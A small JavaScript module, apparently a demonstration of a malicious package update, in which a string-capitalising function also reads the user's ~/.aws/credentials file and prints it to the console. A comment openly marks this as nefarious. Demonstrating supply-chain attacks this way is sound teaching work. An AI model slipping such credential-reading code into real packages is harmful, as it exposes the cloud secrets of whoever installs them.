function v2(string) {
  // Nefarious code in v2
  const data = require("fs").readFileSync(
    require("path").join(require("os").homedir(), ".aws/credentials")
  );
  console.warn("😼 Look what I found:\n\n", data.toString());

  if (typeof string !== "string") {
    throw new TypeError("Argument passed must be of type string");
  }
  return string ? string[0].toUpperCase() + string.slice(1) : string;
}

module.exports = v2;
